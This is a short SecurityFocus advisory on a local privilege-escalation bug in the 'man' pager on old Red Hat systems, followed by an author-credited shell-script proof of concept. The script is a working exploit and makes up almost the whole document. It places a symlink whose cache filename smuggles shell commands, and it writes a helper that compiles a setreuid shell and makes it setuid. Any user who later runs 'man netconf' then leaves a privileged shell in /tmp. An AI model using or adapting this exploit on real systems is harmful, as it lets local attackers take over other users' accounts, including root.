source: http://www.securityfocus.com/bid/2815/info
 
A vulnerability exists in the 'man' system manual pager program.
 
It is possible for local users to cause man to cache files in the system cache directory from outside of the configured manual page hierarchy search path.
 
Combined with the behaviours of 'man' and 'mandb' or any other utilities which trust cache filenames, it may be possible to use this vulnerability to elevate privileges.

#!/bin/sh
###################################################
# Fri May 18 22:08:42 JAVT 2001                   #
# ----------------------------------------------- #
# man MANPATH symlink redirection bugs            #
# proof of concept.                               #
# version affected:                               #
#   <= man-1.5h1-20                               #
#                                                 #
# tested on:                                      #
#  redhat7.1 -> any user suidshell                #
#                                                 #
# by jenggo <luki@karet.org>                      #
#                                                 #
# thanx to: echo, mayonaise all @ #karet          #
###################################################
# hmmm ... ada yang bisa modif jadi instant root ?? :P

# IMPORTANT !
# set this to command that has no man page
DEADLY_BIN="netconf"

# on <= redhat6.2 could be /var/cache/catman
CACHEDIR="/var/cache/man"
CACHEDIR2="/var/cache/catman"

GZ="/bin/gzip"

echo -n "check man dir ..."

if [ ! -d $CACHEDIR ]; then
  if [ -d $CACHEDIR2 ]; then
    CACHEDIR=$CACHEDIR2
    echo "OK"
  else
    echo "FAILED"
    echo "check your man dir"
    exit
  fi
else
  echo "OK"
fi 

echo -n "checking sgid/suid man ..."
if [ ! -g /usr/bin/man ]; then
# is it a debian man?
  if [ -d /usr/lib/man-db ]; then
    echo "FAILED"
    echo "I think this is debian style man, use other script"
  else
    echo "FAILED"
    echo "can't find executables sgid man binary"
  fi
  exit
else
  echo "OK"
fi

echo "making our man directory ..."
echo 

mkdir -p /tmp/man/man1
mkdir /tmp/cat1
mkdir /tmp/mine
chmod 777 /tmp/mine

echo "creating our man page ..."
echo 

echo "BEBAS EUY"|$GZ -c > /tmp/man/man1/huhuy.1.gz

echo "creating symlink ..."
echo 

ln -s "$CACHEDIR/cat1/netconf.1.gz;cd ..;cd ..;cd ..;cd ..;cd tmp;cd mine;export PATH=.;manx" /tmp/cat1/huhuy.1.gz

echo "creating our bogus command ..."
echo 
touch /tmp/huhuy

echo "making manx shellscript"
echo 

/bin/cat > /tmp/mine/manx <<EOF
#!/bin/sh

export PATH="/bin:/usr/bin:/sbin:/usr/sbin"
VICTIM=\`/usr/bin/id -u\`

/bin/cat >/tmp/mine/my"\$VICTIM".c <<EOG
#include <stdio.h>
void main()
{
  char *hh[2]={"/bin/sh", NULL};
  setreuid(\$VICTIM,\$VICTIM);
  execve(hh[0], hh, NULL);
}
EOG

/usr/bin/gcc /tmp/mine/my"\$VICTIM".c -o /tmp/mine/my\$VICTIM 1>/dev/null 2>/dev/null

/bin/rm -f /tmp/mine/my"\$VICTIM".c 1>/dev/null 2>/dev/null

chmod 6755 /tmp/mine/my\$VICTIM 1>/dev/null 2>/dev/null

EOF

chmod 755 /tmp/mine/manx

if [ ! -x /tmp/mine/manx ]; then
  echo "file: /tmp/mine/manx can't be set executable !"
  echo "fix the exploit first"
  echo "cleaning up ..."
  /bin/rm -rf /tmp/man /tmp/cat1 /tmp/mine /tmp/huhuy
  exit
fi

echo "prepare to exploit ..."
echo 

export PATH=../../../../../../tmp
cd /

echo "exploiting ..."
echo 

/usr/bin/man -d huhuy 2>/dev/null

export PATH=/bin:/usr/bin

echo "checking our exploit result"
echo 

if [ -f "/var/cache/man/cat1/$DEADLY_BIN.1.gz;cd ..;cd ..;cd ..;cd ..;cd tmp;cd mine;export PATH=.;manx" ]; then
  echo "content of $CACHEDIR/cat1:"
  ls -l $CACHEDIR/cat1
  echo
  echo "exploit OK, now wait till somebody run 'man $DEADLY_BIN'"
  echo "and your suidshells will be waiting at /tmp/mine/* :)"
  echo "bye."
  echo "[-------- jenggo <luki@karet.org> --------]"
  echo
else
  echo "hrrmm ... exploit failed to create offending file !"
  echo "check again please"
  echo "cleaning up ..."
  /bin/rm -rf /tmp/man /tmp/cat1 /tmp/mine /tmp/huhuy
fi